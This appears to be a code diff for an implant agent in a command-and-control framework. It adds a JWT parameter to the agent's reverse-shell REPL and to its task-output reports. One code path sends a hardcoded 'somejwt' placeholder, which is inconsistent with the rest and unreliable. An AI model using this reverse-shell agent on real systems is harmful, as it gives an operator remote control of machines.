@@ -20,6 +20,7 @@ use crate::shell::terminal::{VtWriter, render};
 
 pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
     task_id: i64,
+    jwt: String,
     mut transport: T,
     agent: ImixAgent<T>,
 ) -> Result<()> {
@@ -47,12 +48,13 @@ pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
     transport.reverse_shell(output_rx, input_tx).await?;
 
     // Move logic to blocking thread
-    run_repl_loop(task_id, input_rx, output_tx, agent).await;
+    run_repl_loop(task_id, jwt, input_rx, output_tx, agent).await;
     Ok(())
 }
 
 async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
     task_id: i64,
+    jwt: String,
     mut input_rx: tokio::sync::mpsc::Receiver<ReverseShellResponse>,
     output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
     agent: ImixAgent<T>,
@@ -62,12 +64,14 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
             tx: output_tx.clone(),
             task_id,
             agent: agent.clone(),
+            jwt: jwt.clone(),
         });
 
         let backend = Arc::new(EmptyAssets {});
         let mut interpreter = Interpreter::new_with_printer(printer)
             .with_default_libs()
-            .with_task_context(Arc::new(agent), task_id, Vec::new(), backend);
+            .with_task_context(Arc::new(agent), task_id, jwt, Vec::new(), backend);
+
         let mut repl = Repl::new();
         let stdout = VtWriter {
             tx: output_tx.clone(),
@@ -182,6 +186,7 @@ struct ShellPrinter<T: Transport> {
     tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
     task_id: i64,
     agent: ImixAgent<T>,
+    jwt: String,
 }
 
 impl<T: Transport + Send + Sync> fmt::Debug for ShellPrinter<T> {
@@ -212,6 +217,7 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
                 exec_started_at: None,
                 exec_finished_at: None,
             }),
+            jwt: self.jwt.clone(),
         };
         let _ = self.agent.report_task_output(req);
     }
@@ -235,6 +241,7 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
                 exec_started_at: None,
                 exec_finished_at: None,
             }),
+            jwt: "somejwt".to_string(),
         };
         let _ = self.agent.report_task_output(req);
     }
